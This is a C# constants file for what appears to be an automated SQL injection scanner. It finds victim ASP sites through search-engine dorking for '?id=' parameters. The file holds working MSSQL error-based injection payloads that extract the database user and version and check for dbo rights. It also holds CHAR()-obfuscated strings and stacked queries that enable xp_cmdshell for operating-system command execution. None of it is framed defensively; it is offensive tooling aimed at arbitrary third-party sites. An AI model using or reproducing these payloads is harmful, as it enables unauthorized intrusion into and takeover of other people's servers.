using System;
using System.Collections.Generic;
using System.Text;

namespace ScannerAdvSQLInjection {
	static class Global {
		public const string GLOBAL_PROTOCOL_HTTP = "http";
		public const string GLOBAL_PROTOCOL_HTTPS = "https";

		public const string GLOBAL_WEBPAGE_EXTENSION_ASP = ".asp";
		public const string GLOBAL_WEBPAGE_EXTENSION_ASPX = ".aspx";

		public const string GLOBAL_SERVER_SEARCH_ENGINE = "search.yahoo.com";
		public const string GLOBAL_SERVER_SEARCH_ENGINE_LINK_PATTERNS = "ac-algo;td-u;bcan1cb";

		public const string GLOBAL_PARAM_SEARCH_ENGINE_SEARCH = "search?p=";
		public const string GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_VALUE = "\".asp{1}?{2}=\"";
		public const string GLOBAL_PARAM_SEARCH_ENGINE_SEARCH_DEFAULT_VALUE_1 = "id";

		public const string GLOBAL_PARAM_SEARCH_ENGINE_SEED = "&b=";
		public const string GLOBAL_PARAM_SEARCH_ENGINE_SEED_DEFAULT_VALUE = "1";

		public const string GLOBAL_PARAM_SEARCH_ENGINE_VULN_VALUE = "convert(int,(SELECT+USER));--";
		public const string GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_SENTENCE = "nvarchar";
		public const string GLOBAL_RESPONSE_SEARCH_ENGINE_VULN_DBO_USER = "'dbo'";

		public const string GLOBAL_TRANSACT_SQL_ESCAPED_SHOW_ADVANCED_OPTIONS = "CHAR(115)%2BCHAR(104)%2BCHAR(111)%2BCHAR(119)%2BCHAR(32)%2BCHAR(97)%2BCHAR(100)%2BCHAR(118)%2BCHAR(97)%2BCHAR(110)%2BCHAR(99)%2BCHAR(101)%2BCHAR(100)%2BCHAR(32)%2BCHAR(111)%2BCHAR(112)%2BCHAR(116)%2BCHAR(105)%2BCHAR(111)%2BCHAR(110)%2BCHAR(115)";
		public const string GLOBAL_TRANSACT_SQL_ESCAPED_XP_CMDSHELL = "CHAR(120)%2BCHAR(112)%2BCHAR(95)%2BCHAR(99)%2BCHAR(109)%2BCHAR(100)%2BCHAR(115)%2BCHAR(104)%2BCHAR(101)%2BCHAR(108)%2BCHAR(108)";
	
		public const string GLOBAL_SIMPLE_TARGET_QUERY_NAME_1 = "SHOW DATABASE USER";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_VALUE_1 = "convert(int,(SELECT+USER));--";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_NAME_2 = "SHOW DATABASE VERSION";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_VALUE_2 = "convert(int,(SELECT+@@VERSION));--";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_NAME_3 = "[MSSQL >= 2000]: SHOW ADVANCED OPTIONS: 0/1 (DISABLED/ENABLED)";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_VALUE_3 = "convert(int,'show advanced options: '%2Bconvert(nvarchar,(SELECT value FROM master.dbo.sysconfigures WHERE comment = 'show advanced options')));--";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_NAME_4 = "[MSSQL >= 2005]: SHOW ADVANCED OPTIONS: 0/1 (DISABLED/ENABLED)";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_VALUE_4 = "convert(int,'show advanced options: '%2Bconvert(nvarchar,(SELECT value FROM master.sys.configurations WHERE name = 'show advanced options')));--";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_NAME_5 = "[MSSQL >= 2005]: SHOW XP_CMDSHELL: 0/1 (DISABLED/ENABLED)";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_VALUE_5 = "convert(int,'xp_cmdshell: '%2Bconvert(nvarchar,(SELECT value FROM master.sys.configurations WHERE name = 'xp_cmdshell')));--";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_NAME_6 = "[MSSQL >= 2005 ESCAPED]: SHOW ADVANCED OPTIONS: 0/1 (DISABLED/ENABLED)";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_VALUE_6 = "convert(int,(SELECT " + Global.GLOBAL_TRANSACT_SQL_ESCAPED_SHOW_ADVANCED_OPTIONS + "%2BCHAR(58)%2BCHAR(32))%2Bconvert(nvarchar,(SELECT value FROM master.sys.configurations WHERE name = (SELECT " + Global.GLOBAL_TRANSACT_SQL_ESCAPED_SHOW_ADVANCED_OPTIONS + "))));--";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_NAME_7 = "[MSSQL >= 2005 ESCAPED]: SHOW XP_CMDSHELL: 0/1 (DISABLED/ENABLED)";
		public const string GLOBAL_SIMPLE_TARGET_QUERY_VALUE_7 = "convert(int,(SELECT " + Global.GLOBAL_TRANSACT_SQL_ESCAPED_XP_CMDSHELL + "%2BCHAR(58)%2BCHAR(32))%2Bconvert(nvarchar,(SELECT value FROM master.sys.configurations WHERE name = (SELECT " + Global.GLOBAL_TRANSACT_SQL_ESCAPED_XP_CMDSHELL + "))));--";

		public const string GLOBAL_ADVANCED_TARGET_QUERY_NORMAL_1 = "EXEC master.dbo.sp_configure 'show advanced options', 1; RECONFIGURE; EXEC master.dbo.sp_configure 'xp_cmdshell', 1; RECONFIGURE;--";
		public const string GLOBAL_ADVANCED_TARGET_QUERY_ESCAPED_1 = "EXEC master.dbo.sp_configure (SELECT " + Global.GLOBAL_TRANSACT_SQL_ESCAPED_SHOW_ADVANCED_OPTIONS + "), 1; RECONFIGURE; EXEC master.dbo.sp_configure (SELECT " + Global.GLOBAL_TRANSACT_SQL_ESCAPED_XP_CMDSHELL + "), 1; RECONFIGURE;--";

		public const string GLOBAL_PROMPT_TARGET_OUTPUT = ">>>";
		public const string GLOBAL_ERROR_NO_RESPONSE_TARGET_OUTPUT = "INCORRECT RESPONSE (INCREASE TIMEOUT)";
	}
}
